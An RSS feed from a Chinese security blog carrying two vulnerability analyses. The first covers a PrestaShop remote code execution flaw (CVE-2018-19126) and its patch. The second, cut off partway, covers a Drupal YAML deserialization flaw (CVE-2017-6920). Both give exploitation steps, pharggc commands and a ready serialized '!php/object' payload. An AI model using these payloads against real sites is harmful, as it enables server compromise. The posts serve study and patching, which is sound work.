<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Blog on 诗与胡说</title>
    <link>https://kylingit.com/blog/index.xml</link>
    <description>Recent content in Blog on 诗与胡说</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh_cn</language>
    <copyright>Copyright © 2018 kylinking</copyright>
    <lastBuildDate>Wed, 19 Dec 2018 16:48:02 +0000</lastBuildDate>
    <atom:link href="https://kylingit.com/blog/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>PrestaShop后台远程代码执行漏洞分析(CVE-2018-19126)</title>
      <link>https://kylingit.com/blog/prestashop%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2018-19126/</link>
      <pubDate>Wed, 19 Dec 2018 16:48:02 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/prestashop%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2018-19126/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;PrestaShop是一款针对web2.0设计的全功能、跨平台的免费开源电子商务解决方案，自08年1.0版本发布，短短两年时间，发展迅速，全球已超过四万家网店采用Prestashop进行部署。Prestashop基于Smarty引擎编程设计，模块化设计，扩展性强，能轻易实现多种语言，多种货币浏览交易，支持Paypal等几乎所有的支付手段，是外贸网站建站的佳选。Prestashop是目前为止，操作最简单，最人性化，用户体验最佳的电子商务解决方案之一。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;11月7日 PrestaShop 官方发布新版本，修复两个高危漏洞，其中&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-19126&#34;&gt;CVE-2018-19126&lt;/a&gt;允许攻击者通过上传精心构造的文件导致任意代码执行，&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-19125&#34;&gt;CVE-2018-19125&lt;/a&gt;则导致攻击者删除服务器上的默认图片上传文件夹。&lt;/p&gt;

&lt;p&gt;公告：&lt;a href=&#34;http://build.prestashop.com/news/prestashop-1-7-4-4-1-6-1-23-maintenance-releases/&#34;&gt;http://build.prestashop.com/news/prestashop-1-7-4-4-1-6-1-23-maintenance-releases/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;补丁：&lt;a href=&#34;https://github.com/PrestaShop/PrestaShop/pull/11287&#34;&gt;https://github.com/PrestaShop/PrestaShop/pull/11287&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;由于该漏洞触发需要后台上传权限，在这个系统中有上传权限的角色包括物流员、翻译者、销售人员，所以漏洞影响面还是有限。&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;1.6.x before 1.6.1.23&lt;/p&gt;

&lt;p&gt;1.7.x before 1.7.4.4&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;0x03-环境搭建&#34;&gt;0x03 环境搭建&lt;/h4&gt;

&lt;p&gt;下载&lt;code&gt;1.7.4.3&lt;/code&gt;版本并安装&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://assets.prestashop2.com/en/system/files/ps_releases/prestashop_1.7.4.3.zip&#34;&gt;https://assets.prestashop2.com/en/system/files/ps_releases/prestashop_1.7.4.3.zip&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在安装过程中会强制要求修改默认后台路径&lt;code&gt;admin&lt;/code&gt;，同时要求删除&lt;code&gt;install&lt;/code&gt;文件夹，从安全角度来讲，这是一个好设计：）&lt;/p&gt;

&lt;p&gt;此案例中后台路径命名为&lt;code&gt;/admin-rename/&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x04-漏洞分析&#34;&gt;0x04 漏洞分析&lt;/h4&gt;

&lt;p&gt;根据&lt;a href=&#34;https://github.com/PrestaShop/PrestaShop/pull/11287/commits/4c6958f40cf7faa58207a203f3a5523cc8015148&#34;&gt;补丁&lt;/a&gt;位置显示漏洞出现在后台处理文件上传的模块，在&lt;code&gt;admin-dev/filemanager/ajax_calls.php&lt;/code&gt;的&lt;code&gt;image_size&lt;/code&gt;case分支，新版本直接删除了这段代码，其中最值得怀疑的是&lt;code&gt;getimagesize()&lt;/code&gt;函数，在10月份披露的国外轻量级开源论坛系统&lt;code&gt;Vanilla Forums&lt;/code&gt;就是因为该函数导致了一个远程代码执行漏洞，详细可以看&lt;a href=&#34;https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;那么&lt;code&gt;getimagesize()&lt;/code&gt;函数存在什么问题呢？在今年的&lt;code&gt;BlackHat&lt;/code&gt;大会上由&lt;code&gt;Sam Thomas&lt;/code&gt;分享的反序列化漏洞议题主要讲了被忽略的&lt;code&gt;phar://&lt;/code&gt;协议导致的&lt;code&gt;phar&lt;/code&gt;反序列化漏洞，此前也简单介绍了一下这个议题，参考&lt;a href=&#34;https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;由PHPGGC理解PHP反序列化漏洞&lt;/a&gt;，在这里面提到一些在解析&lt;code&gt;phar://&lt;/code&gt;协议时会产生风险的常用函数，如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539063733837.png&#34; alt=&#34;1539063733837&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;getimagesize()&lt;/code&gt;同样存在这个问题，当调用&lt;code&gt;getimagesize(&#39;phar://some/phar.ext&#39;);&lt;/code&gt;的时候，&lt;code&gt;php&lt;/code&gt;解析&lt;code&gt;phar&lt;/code&gt;文件时会进行反序列化，如果其内容是恶意构造的，就能达到任意代码执行的效果&lt;/p&gt;

&lt;p&gt;风险点找到了，接下来看一下如何触发漏洞&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ajax_calls.php&lt;/code&gt;在&lt;code&gt;filemanager&lt;/code&gt;模块下面，通过&lt;code&gt;http://host/admin-rename/filemanager/dialog.php&lt;/code&gt;页面调用，这个页面主要功能就是上传文件，以及创建文件夹，文件排序、删除等等，通过&lt;code&gt;action&lt;/code&gt;参数控制操作，所以可以直接通过&lt;code&gt;action=image_size&lt;/code&gt;访问到漏洞触发点&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;dialog.php&lt;/code&gt;开头设置了一个&lt;code&gt;verify&lt;/code&gt;字段&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$_SESSION[&amp;quot;verify&amp;quot;] = &amp;quot;RESPONSIVEfilemanager&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而在页面检查了这个字段的值，所以无法直接访问&lt;code&gt;ajax_calls.php&lt;/code&gt;页面，必须先访问&lt;code&gt;dialog.php&lt;/code&gt;，目的应该是为了保证文件操作都是从&lt;code&gt;dialog.php&lt;/code&gt;页面进行的吧&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if ($_SESSION[&#39;verify&#39;] != &#39;RESPONSIVEfilemanager&#39;) {
    die(&#39;Forbidden&#39;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后我们就可以上传一个&lt;code&gt;phar&lt;/code&gt;文件，当然系统限制文件后缀只能在白名单内&lt;code&gt;&#39;jpg&#39;, &#39;jpeg&#39;, &#39;png&#39;, &#39;gif&#39;, &#39;bmp&#39;, &#39;tiff&#39;, &#39;svg&#39;, &#39;pdf&#39;, &#39;mov&#39;, &#39;mpeg&#39;, &#39;mp4&#39;, &#39;avi&#39;, &#39;mpg&#39;, &#39;wma&#39;, &#39;flv&#39;, &#39;webm&#39;&lt;/code&gt;，所以需要将&lt;code&gt;phar&lt;/code&gt;文件重命名符合要求的后缀。由于在&lt;code&gt;phar://&lt;/code&gt;解析时只要满足&lt;code&gt;phar&lt;/code&gt;文件标识，即文件头必须以&lt;code&gt;__HALT_COMPILER();?&amp;gt;&lt;/code&gt;结尾，所以并不限制文件后缀。此处也有一个技巧，我们可以创建一个合法的&lt;code&gt;jpeg&lt;/code&gt;文件，同时又是一个&lt;code&gt;phar&lt;/code&gt;文件，这个文件甚至可以绕过&lt;code&gt;MIME&lt;/code&gt;检查，关于这个技巧可以参考&lt;a href=&#34;https://www.nc-lp.com/blog/disguise-phar-packages-as-images&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接下来具体看&lt;code&gt;image_size&lt;/code&gt;分支&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;case &#39;image_size&#39;:
    if (realpath(dirname(_PS_ROOT_DIR_.$_POST[&#39;path&#39;])) != realpath(_PS_ROOT_DIR_.$upload_dir)) {
        die();
    }
    $pos = strpos($_POST[&#39;path&#39;], $upload_dir);
    if ($pos !== false) {
        $info = getimagesize(substr_replace($_POST[&#39;path&#39;], $current_path, $pos, strlen($upload_dir)));
        echo json_encode($info);
    }

    break;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第一个&lt;code&gt;if&lt;/code&gt;条件，检查&lt;code&gt;path&lt;/code&gt;参数的绝对路径是否和系统定义的&lt;code&gt;upload_dir&lt;/code&gt;绝对路径相等，&lt;code&gt;upload_dir&lt;/code&gt;的值是&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$upload_dir = Context::getContext()-&amp;gt;shop-&amp;gt;getBaseURI().&#39;img/cms/&#39;; // path from base_url to base of upload folder (with start and final /)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而我们要&lt;code&gt;post&lt;/code&gt;的&lt;code&gt;path&lt;/code&gt;参数是这个样子&lt;code&gt;phar://path/phar.jpg&lt;/code&gt;，显然无法通过判断。这时候考虑一下，假如我们把默认上传路径修改了，比如改成&lt;code&gt;img/test/&lt;/code&gt;，那么系统就会找不到&lt;code&gt;img/cms/&lt;/code&gt;这个路径，&lt;code&gt;realpath&lt;/code&gt;返回结果为&lt;code&gt;false&lt;/code&gt;，那么就可以绕过这个条件。&lt;/p&gt;

&lt;p&gt;那么什么办法可以修改这个路径呢？&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;admin-rename/filemanager/execute.php&lt;/code&gt;文件可以看到有一些文件及文件夹操作，允许用户删除或者重命名文件夹，通过&lt;code&gt;action&lt;/code&gt;和&lt;code&gt;name&lt;/code&gt;参数我们可以将默认的&lt;code&gt;img/cms/&lt;/code&gt;修改成自定义文件夹，甚至可以删除这个路径，这也就是&lt;code&gt;CVE-2018-19125&lt;/code&gt;这个漏洞的触发位置。&lt;/p&gt;

&lt;p&gt;接下来看第2个条件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$pos = strpos($_POST[&#39;path&#39;], $upload_dir);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此处只要让&lt;code&gt;path&lt;/code&gt;参数包含&lt;code&gt;img/cms/&lt;/code&gt;字符串即可，这样经过后面的替换和拼接，&lt;code&gt;path&lt;/code&gt;就类似于&lt;code&gt;phar://img/test/phar.pdf/var/www/html/img/cms/&lt;/code&gt;，不影响&lt;code&gt;phar&lt;/code&gt;解析&lt;/p&gt;

&lt;p&gt;&lt;code&gt;phar&lt;/code&gt;文件最终进入&lt;code&gt;getimagesize()&lt;/code&gt;，如果序列化一个可以执行任意代码的类，生成恶意的&lt;code&gt;phar&lt;/code&gt;文件，构造一条完整的&lt;code&gt;POP&lt;/code&gt;链，就可以形成一个&lt;code&gt;RCE&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;PrestaShop&lt;/code&gt;项目中存在&lt;code&gt;Monolog&lt;/code&gt;，这是&lt;code&gt;php&lt;/code&gt;下一个日志记录类库， 在这个库中的&lt;code&gt;BufferHandler&lt;/code&gt;类的&lt;code&gt;handle&lt;/code&gt;函数有一段存在风险的代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function handle(array $record){
    //...
	if ($this-&amp;gt;processors) {
    	foreach ($this-&amp;gt;processors as $processor) {
        	$record = call_user_func($processor, $record);
    	}
	}
    //...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果&lt;code&gt;$this-&amp;gt;processors&lt;/code&gt;和&lt;code&gt;$record&lt;/code&gt;均可控的话，就可以造成一个命令执行，所以我们可以序列化这个类构造&lt;code&gt;POP&lt;/code&gt;链&lt;/p&gt;

&lt;h4 id=&#34;0x05-漏洞利用&#34;&gt;0x05 漏洞利用&lt;/h4&gt;

&lt;h5 id=&#34;一-生成phar文件&#34;&gt;一、生成phar文件&lt;/h5&gt;

&lt;p&gt;我们利用之前介绍过的&lt;a href=&#34;https://github.com/s-n-t/phpggc&#34;&gt;PHARGCC&lt;/a&gt;工具生成一个包含&lt;code&gt;POP&lt;/code&gt;链的&lt;code&gt;phar&lt;/code&gt;文件，选择&lt;code&gt;Monolog/RCE1&lt;/code&gt;，看一下这个&lt;code&gt;gadget&lt;/code&gt;的使用&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&amp;gt; pharggc -i Monolog/RCE1
Name           : Monolog/RCE1
Version        : 1.18 &amp;lt;= 1.23
Type           :
Vector         : __destruct

./pharggc Monolog/RCE1 &amp;lt;code&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;生成一个&lt;code&gt;out.phar&lt;/code&gt;，并重命名成&lt;code&gt;out.png&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;&amp;gt; pharggc Monolog/RCE1 &amp;quot;phpinfo();&amp;quot;
Payload written to: out.phar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后通过&lt;code&gt;http://host/admin-rename/filemanager/dialog.php&lt;/code&gt;上传到服务器上&lt;/p&gt;

&lt;h5 id=&#34;二-重命名默认上传目录&#34;&gt;二、重命名默认上传目录&lt;/h5&gt;

&lt;p&gt;通过&lt;code&gt;http://host/admin-rename/filemanager/execute.php?action=rename_folder&lt;/code&gt;重命名默认上传目录&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20181220111941.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;三-发送payload&#34;&gt;三、发送payload&lt;/h5&gt;

&lt;p&gt;通过&lt;code&gt;path&lt;/code&gt;参数传入上传的&lt;code&gt;phar&lt;/code&gt;文件，&lt;code&gt;getimagesize()&lt;/code&gt;自动解析&lt;code&gt;phar&lt;/code&gt;，触发反序列化&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20181220103714.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x06-补丁分析&#34;&gt;0x06 补丁分析&lt;/h4&gt;

&lt;p&gt;补丁位置：&lt;a href=&#34;https://github.com/PrestaShop/PrestaShop/pull/11287&#34;&gt;https://github.com/PrestaShop/PrestaShop/pull/11287&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20181220105842.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;官方对这两处漏洞做了修复，一方面是直接删除了&lt;code&gt;case &#39;image_size&#39;&lt;/code&gt;分支，一方面也严格检查了文件&lt;code&gt;mime&lt;/code&gt;类型，同时对&lt;code&gt;realpath&lt;/code&gt;检查时限制了必须是已存在的目录&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20181220110721.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20181220110815.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x07-总结&#34;&gt;0x07 总结&lt;/h4&gt;

&lt;p&gt;这个漏洞触发流程并不复杂，几个限制也能简单地绕过，关键在于某些函数没有考虑到传入&lt;code&gt;phar://&lt;/code&gt;的情况，在解析该协议时产生反序列化漏洞。另外值得注意的是，&lt;code&gt;php.ini&lt;/code&gt;中&lt;code&gt;phar.readonly = On&lt;/code&gt;选项并不会影响&lt;code&gt;phar&lt;/code&gt;解析，没有关闭此选项(默认为&lt;code&gt;On&lt;/code&gt;)依旧会导致漏洞触发，近段时间以来基于&lt;code&gt;phar&lt;/code&gt;的漏洞也在逐渐增加，希望能够引起开发者的重视。&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>由PHPGGC理解PHP反序列化漏洞</title>
      <link>https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Mon, 08 Oct 2018 14:43:41 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h2 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ambionics/phpggc&#34;&gt;PHPGGC&lt;/a&gt;是一款能够自动生成主流框架的序列化测试&lt;code&gt;payload&lt;/code&gt;的工具，类似Java中的&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;ysoserial&lt;/a&gt;，当前支持的框架包括&lt;code&gt;Doctrine&lt;/code&gt;, &lt;code&gt;Guzzle&lt;/code&gt;, &lt;code&gt;Laravel&lt;/code&gt;, &lt;code&gt;Magento&lt;/code&gt;, &lt;code&gt;Monolog&lt;/code&gt;, &lt;code&gt;Phalcon&lt;/code&gt;, &lt;code&gt;Slim&lt;/code&gt;, &lt;code&gt;SwiftMailer&lt;/code&gt;, &lt;code&gt;Symfony&lt;/code&gt;, &lt;code&gt;Yii&lt;/code&gt; 和 &lt;code&gt;ZendFramework&lt;/code&gt;，可以说是反序列化的武器库了。本文从该工具出发，以Drupal Yaml反序列化漏洞和Typo3反序列化漏洞为例，分析其中的多种利用方式，并介绍一下今年BlackHat议题关于新型php反序列化攻击的部分。&lt;/p&gt;

&lt;h2 id=&#34;0x02-drupal-yaml反序列化漏洞&#34;&gt;0x02 Drupal Yaml反序列化漏洞&lt;/h2&gt;

&lt;h3 id=&#34;一-介绍&#34;&gt;一、介绍&lt;/h3&gt;

&lt;p&gt;关于&lt;code&gt;Drupal&lt;/code&gt;就不过多介绍了，前阵子两个RCE漏洞杀伤力巨大，这次介绍的是去年披露的关于反序列化的漏洞，&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2017-6920&#34;&gt;CVE-2017-6920&lt;/a&gt;，官方描述是YAML解析器处理不当导致的一个远程代码执行漏洞&lt;/p&gt;

&lt;blockquote&gt;
&lt;h3 id=&#34;pecl-yaml-parser-unsafe-object-handling-critical-drupal-8-cve-2017-6920&#34;&gt;PECL YAML parser unsafe object handling - Critical - Drupal 8 - CVE-2017-6920&lt;/h3&gt;

&lt;p&gt;PECL YAML parser does not handle PHP objects safely during certain operations within Drupal core. This could lead to remote code execution.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;详情见&lt;a href=&#34;https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple&#34;&gt;SA-CORE-2017-003&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;二-漏洞分析&#34;&gt;二、漏洞分析&lt;/h3&gt;

&lt;p&gt;先来看一下补丁，diff 8.3.3 和 8.3.4 版本，主要修改点在&lt;code&gt;core/lib/Drupal/Component/Serialization/YamlPecl.php&lt;/code&gt;文件&lt;code&gt;decode&lt;/code&gt;方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1538990057077.png&#34; alt=&#34;1538990057077&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可见在&lt;code&gt;yaml_parse&lt;/code&gt;前进行了&lt;code&gt;ini_set(&#39;yaml.decode_php&#39;, 0);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;用户可控制的参数&lt;code&gt;$raw&lt;/code&gt;直接传给了&lt;code&gt;yaml_parse&lt;/code&gt;函数，而在手册上关于&lt;code&gt;yaml_parse&lt;/code&gt;函数有这么一个注意点：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Warning&lt;/p&gt;

&lt;p&gt;Processing untrusted user input with yaml_parse() is dangerous if the use of unserialize() is enabled for nodes using the !php/object tag. This behavior can be disabled by using the yaml.decode_php ini setting.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;也就是说，如果使用了&lt;code&gt;yaml&lt;/code&gt;标志&lt;code&gt;!php/object&lt;/code&gt;，那么这个内容会通过&lt;code&gt;unserialize()&lt;/code&gt;进行处理，设置&lt;code&gt;yaml.decode_php&lt;/code&gt;则可以禁止，这就是为什么补丁增加了这行代码。&lt;/p&gt;

&lt;p&gt;看一下调用&lt;code&gt;decode()&lt;/code&gt;方法的地方，&lt;code&gt;core/lib/Drupal/Component/Serialization/Yaml.php&lt;/code&gt;：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public static function decode($raw) {
    $serializer = static::getSerializer();
    return $serializer::decode($raw);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在&lt;code&gt;Yaml&lt;/code&gt;类的&lt;code&gt;decode()&lt;/code&gt;方法调用了&lt;code&gt;static::getSerializer()&lt;/code&gt;方法，跟入&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1538993007544.png&#34; alt=&#34;1538993007544&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到加载了&lt;code&gt;yaml&lt;/code&gt;扩展后就会进入&lt;code&gt;YamlPecl&lt;/code&gt;类，进而调用&lt;code&gt;Yaml::decode()&lt;/code&gt;方法，搜索调用&lt;code&gt;Yaml::decode&lt;/code&gt;并且参数能被控制的地方，在&lt;code&gt;core/modules/config/src/Form/ConfigSingleImportForm.php&lt;/code&gt;的&lt;code&gt;validateForm()&lt;/code&gt;方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$data = Yaml::decode($form_state-&amp;gt;getValue(&#39;import&#39;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;validateForm()&lt;/code&gt;的调用处在&lt;code&gt;http://127.0.0.1/drupal-8.3.3/admin/config/development/configuration/single/import&lt;/code&gt;，&lt;code&gt;decode()&lt;/code&gt;的参数直接从表单获取，于是通过&lt;code&gt;import&lt;/code&gt;将恶意参数传递进去。&lt;/p&gt;

&lt;h3 id=&#34;三-漏洞利用&#34;&gt;三、漏洞利用&lt;/h3&gt;

&lt;p&gt;现在我们需要找到一个类，使之在被反序列化的时候执行危险函数，常规搜索&lt;code&gt;_destruct&lt;/code&gt;、&lt;code&gt;_tostring&lt;/code&gt;以及&lt;code&gt;_wakeup&lt;/code&gt;方法，在&lt;code&gt;drupal&lt;/code&gt;核心中有这么三个类可以被利用，其中两个在&lt;code&gt;phpggc&lt;/code&gt;工具中已经集成 ，另一个我们手动加入到&lt;code&gt;phpggc&lt;/code&gt;中&lt;/p&gt;

&lt;h4 id=&#34;1-远程代码执行&#34;&gt;1.  远程代码执行&lt;/h4&gt;

&lt;p&gt;&lt;code&gt;vendor/guzzlehttp/psr7/src/FnStream.php&lt;/code&gt; &lt;code&gt;FnStream&lt;/code&gt;类的&lt;code&gt;__destruct()&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;  public function __destruct()
  {
      if (isset($this-&amp;gt;_fn_close)) {
          call_user_func($this-&amp;gt;_fn_close);
      }
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们通过序列化这个类，传递参数&lt;code&gt;_fn_close&lt;/code&gt;为任意php代码，在&lt;code&gt;yaml_parse&lt;/code&gt;的时候反序列化便可以造成一个任意代码执行。&lt;/p&gt;

&lt;p&gt;在PHPGGC中已经内置这个类，查看信息&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539050117155.png&#34; alt=&#34;1539050117155&#34; /&gt;&lt;/p&gt;

&lt;p&gt;看一下内部实现&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539050287387.png&#34; alt=&#34;1539050287387&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;phpggc&lt;/code&gt;将&lt;code&gt;_fn_close&lt;/code&gt;参数设置为&lt;code&gt;HandlerStack&lt;/code&gt;类，再在&lt;code&gt;HandlerStack&lt;/code&gt;序列化的时候传入可控参数&lt;code&gt;$handler&lt;/code&gt;，而在这个案例中我们不需要额外的&lt;code&gt;HandlerStack&lt;/code&gt;类了，所以对&lt;code&gt;generate()&lt;/code&gt;方法稍加修改，直接构造一个&lt;code&gt;FnStream&lt;/code&gt;类，注意参数是&lt;code&gt;array&lt;/code&gt;类型：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;return new \GuzzleHttp\Psr7\FnStream([
    &#39;close&#39; =&amp;gt; $code
]);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后生成序列化数据：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539050803329.png&#34; alt=&#34;1539050803329&#34; /&gt;&lt;/p&gt;

&lt;p&gt;接着拼接&lt;code&gt;YAML_PHP_TAG&lt;/code&gt;即&lt;code&gt;!php/object&lt;/code&gt;，并且要将字符串转义，注意序列化数据中的空字符，我们将其替换成&lt;code&gt;\0&lt;/code&gt;，最终生成的字符串如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;!php/object &amp;quot;O:24:\&amp;quot;GuzzleHttp\\Psr7\\FnStream\&amp;quot;:2:{s:33:\&amp;quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&amp;quot;;a:1:{s:5:\&amp;quot;close\&amp;quot;;s:7:\&amp;quot;phpinfo\&amp;quot;;}s:9:\&amp;quot;_fn_close\&amp;quot;;s:7:\&amp;quot;phpinfo\&amp;quot;;}&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在&lt;code&gt;http://127.0.0.1/drupal-8.3.3/admin/config/development/configuration/single/import&lt;/code&gt;import序列化后的数据，便可以执行代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539051346096.png&#34; alt=&#34;1539051346096&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539051456660.png&#34; alt=&#34;1539051456660&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;2-任意文件写入&#34;&gt;2.  任意文件写入&lt;/h4&gt;

&lt;p&gt;上面&lt;code&gt;call_user_func()&lt;/code&gt;造成了一个任意代码执行，我们再找到一个&lt;code&gt;file_put_contents()&lt;/code&gt;造成任意文件写入&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php&lt;/code&gt;的&lt;code&gt;FileCookieJar&lt;/code&gt;类&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539051809132.png&#34; alt=&#34;1539051809132&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;__destruct()&lt;/code&gt;调用&lt;code&gt;save()&lt;/code&gt;方法，通过&lt;code&gt;file_put_contents()&lt;/code&gt;写入文件内容，而文件名和文件内容均是我们可以控制的，所以此处可以写入一个shell&lt;/p&gt;

&lt;p&gt;同样地看一下&lt;code&gt;phpggc&lt;/code&gt;中有关&lt;code&gt;FileCookieJar&lt;/code&gt;类的部分：&lt;code&gt;gadgetchains/Guzzle/FW/1/chain.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1539052187458.png&#34; alt=&#34;1539052187458&#34; /&gt;&lt;/p&gt;

&lt;p&gt;通过这个类生成序列化数据&lt;/p&gt;

